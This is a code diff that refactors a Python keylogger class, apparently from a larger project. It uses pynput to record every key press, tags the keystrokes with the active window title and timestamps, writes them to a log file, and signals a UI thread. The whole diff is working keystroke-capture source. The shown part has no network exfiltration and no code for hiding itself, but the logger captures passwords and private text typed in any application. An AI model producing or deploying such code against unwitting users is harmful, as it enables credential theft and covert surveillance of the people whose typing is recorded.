@@ -1,86 +1,85 @@
-import datetime
 
 from pynput import keyboard
+import datetime
+import time
 
 class KeyloggerEngine:
-    """Core keylogging functionality"""
+    """Handles the actual keylogging logic"""
 
-    def __init__(self, file_manager, get_active_window_func):
+    def __init__(self, file_manager, get_active_window_func, log_update_queue=None):
         self.file_manager = file_manager
         self.get_active_window = get_active_window_func
-        self.is_running = False
+        self.log_update_queue = log_update_queue
         self.listener = None
-        self.current_window = ""
-        self.current_log_file = ""
+        self.is_running = False
+        self.current_log_file = None
+        self.last_window = ""
+
+    def _on_press(self, key):
+        """Callback for key press events"""
+        try:
+            # Get current time and active window
+            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            active_window = self.get_active_window()
+
+            # Check if window changed
+            if active_window != self.last_window:
+                self.last_window = active_window
+                log_entry = f"\n\n[--- {active_window} --- {timestamp} ---]\n"
+            else:
+                log_entry = ""
+
+            # Format key
+            if hasattr(key, 'char') and key.char:
+                log_entry += key.char
+            else:
+                # Special keys
+                key_name = str(key).replace("Key.", "")
+                log_entry += f"<{key_name}>"
+
+            # Write to file
+            self.file_manager.write_log(self.current_log_file, log_entry)
+
+            # Notify the UI thread that an update happened
+            if self.log_update_queue:
+                try:
+                    # Put the file path in the queue for the UI to process
+                    self.log_update_queue.put_nowait(self.current_log_file)
+                except:
+                    # Queue might be full, not critical to drop a notification
+                    pass
+
+        except Exception as e:
+            print(f"Error in keylogger: {e}")
 
     def start(self):
         """Start the keylogger"""
-        if not self.is_running:
-            self.is_running = True
-            self.listener = keyboard.Listener(on_press=self._on_key_press)
-            self.listener.start()
+        if self.is_running:
+            return
+
+        self.is_running = True
+        self.current_log_file = self.file_manager.get_log_filename()
+        self.last_window = self.get_active_window()
+
+        # Initial log entry
+        initial_entry = f"\n[--- Logging Started: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---]\n"
+        initial_entry += f"[--- Active Window: {self.last_window} ---]\n"
+        self.file_manager.write_log(self.current_log_file, initial_entry)
+
+        # Start listener in a non-blocking way
+        self.listener = keyboard.Listener(on_press=self._on_press)
+        self.listener.start()
 
     def stop(self):
         """Stop the keylogger"""
-        if self.is_running and self.listener:
-            self.is_running = False
-            self.listener.stop()
-            self.listener = None
-
-    def _on_key_press(self, key):
-        """Handle individual key press events"""
-        if not self.is_running:
+        if not self.is_running or not self.listener:
             return
 
-        log_file = self.file_manager.get_log_filename()
+        # Stop the listener
+        self.listener.stop()
+        self.is_running = False
 
-        # Check for new day/session
-        if log_file != self.current_log_file:
-            self._log_new_session(log_file)
-            self.current_log_file = log_file
-
-        # Check for window change
-        active_window = self.get_active_window()
-        if active_window != self.current_window:
-            self._log_window_change(log_file, active_window)
-            self.current_window = active_window
-
-        # Log the keystroke
-        self._log_keystroke(log_file, key)
-
-    def _log_new_session(self, log_file):
-        """Log start of new session"""
-        with open(log_file, "a", encoding="utf-8") as f:
-            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            f.write(f"\n{'=' * 60}\n")
-            f.write(f"[{timestamp}] NEW SESSION STARTED\n")
-            f.write(f"{'=' * 60}\n")
-
-    def _log_window_change(self, log_file, window_name):
-        """Log application/window change"""
-        with open(log_file, "a", encoding="utf-8") as f:
-            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            f.write(f"\n{'=' * 60}\n")
-            f.write(f"[{timestamp}] APPLICATION: {window_name}\n")
-            f.write(f"{'=' * 60}\n")
-
-    def _log_keystroke(self, log_file, key):
-        """Log individual keystroke"""
-        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-        with open(log_file, "a", encoding="utf-8") as f:
-            try:
-                # Regular character keys
-                f.write(f"[{timestamp}] {key.char}\n")
-            except AttributeError:
-                # Special keys
-                if key == keyboard.Key.space:
-                    f.write(f"[{timestamp}] [SPACE]\n")
-                elif key == keyboard.Key.enter:
-                    f.write(f"[{timestamp}] [ENTER]\n")
-                elif key == keyboard.Key.tab:
-                    f.write(f"[{timestamp}] [TAB]\n")
-                elif key == keyboard.Key.backspace:
-                    f.write(f"[{timestamp}] [BACKSPACE]\n")
-                else:
-                    f.write(f"[{timestamp}] {key}\n")
+        # Final log entry
+        final_entry = f"\n[--- Logging Stopped: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---]\n"
+        self.file_manager.write_log(self.current_log_file, final_entry)
+        self.current_log_file = None
